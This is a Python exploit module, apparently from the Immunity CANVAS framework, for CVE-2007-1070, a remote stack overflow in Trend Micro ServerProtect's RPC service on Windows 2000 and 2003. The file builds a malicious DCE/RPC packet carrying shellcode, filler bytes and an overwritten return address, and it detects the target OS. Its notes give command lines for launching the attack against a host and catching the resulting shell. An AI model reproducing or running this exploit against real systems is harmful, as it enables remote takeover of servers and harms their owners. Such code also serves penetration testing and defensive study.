#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
if '.' not in sys.path: sys.path.append('.')
import struct

from exploitutils import *
import canvasengine
from msrpcexploit import msrpcexploit

# GUI info
NAME='Trend Micro ServerProtect RPC Overflow'
DESCRIPTION='Trend Micro ServerProtect StCommon.dll RPC Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Trend Micro"
DOCUMENTATION['Date public']='02/20/07'
DOCUMENTATION['References']='http://www.tippingpoint.com/security/advisories/TSRT-07-01.html'
DOCUMENTATION['Platforms Tested'] = ''
DOCUMENTATION['Notes']=''
DOCUMENTATION["CVE Name"] = "CVE-2007-1070"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1070"
DOCUMENTATION['CVSS'] = 10.0
VERSION='0.1'
PROPERTY = {}
PROPERTY['TYPE']    = 'Exploit'
PROPERTY['SITE']    = 'Remote'
PROPERTY['ARCH']    = [['Windows']]
PROPERTY['VERSION'] = ['2000','2003']

GTK2_DIALOG='dialog.glade2'

CHANGELOG="""
"""

NOTES="""
5.58 patch 5 seems to be patched, though official security patch dates 15 days
later... Looks like they silently patched it in the quarterly patch?

Tested on:
Trend Micro ServerProtect 5.58 on Windows 2000 Server SP4 English UP2DATE
Trend Micro ServerProtect 5.58 patch 4 on Windows 2000 Server SP4 English UP2DATE
Trend Micro ServerProtect 5.58 on Windows 2003 Standard SP0 English UP2DATE

Usage:
./exploits/tm_sprotect/tm_sprotect.py -v 1 -t 10.10.11.132 -l 10.10.11.1 -d 5555
./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
"""

runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

targets={
    0: ['Autoversioning (N/A)',0],
    1: ['Trend Micro ServerProtect 5.58',0x267533], #jmp ebx
}

class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.version        = 0
        self.badstring      = '\x00'
        self.UUID           = u'25288888-bd5b-11d1-9d53-0080c83a5c2c'
        self.uuidversion    = u'1.0'
        self.targetfunction = 0
        self.name           = NAME
        self.port           = 5168
        self.listenerArgsDict['fromcreatethread'] =1

    def buildConnectionList(self):
        host=self.host
        connectionList=['ncacn_ip_tcp:%s[%d]'%(host, self.port)]
        #connectionList+=self.searchifids()
        #connectionList=uniquelist(connectionList)
        self.connectionList=connectionList
        return self.connectionList

    def testOS(self):
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        self.log('target=%s->%s'%(self.target,app.target))
        result=app.run()
        if result==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        if app.result.find('2000')>-1:
            self.version=1
            self.log('OS vulnerable: %s'%(result))
            return 1
        elif app.result.find('2003')>-1:
            self.version=1
            self.log('OS vulnerable: %s'%(result))
            return 1
        else:
            self.log('OS not vulnerable: %s'%(result))
        return 0

    def buildDcePacket(self):
        self.description,self.eip=targets[self.version]
        data=''
        data+=self.shellcode
        data+='A'*(0x6cc-0x08c-len(data))
        data+=struct.pack('<L',self.eip)
        while (len(data)%4)!=0:
            data+='B'
        packet=''
        packet+=struct.pack('<LL',0x000a0011,len(data))
        packet+=data
        packet+=struct.pack('<LL',len(data),4)
        return packet

    def displayVersions(self):
        i=0
        for listline in targets.values():
            print '%d: %s'%(i,listline[0])
            i=i+1

if __name__=='__main__':
    print 'Running CANVAS '+NAME+' version '+VERSION
    app=theexploit()
    ret=standard_callback_commandline(app)
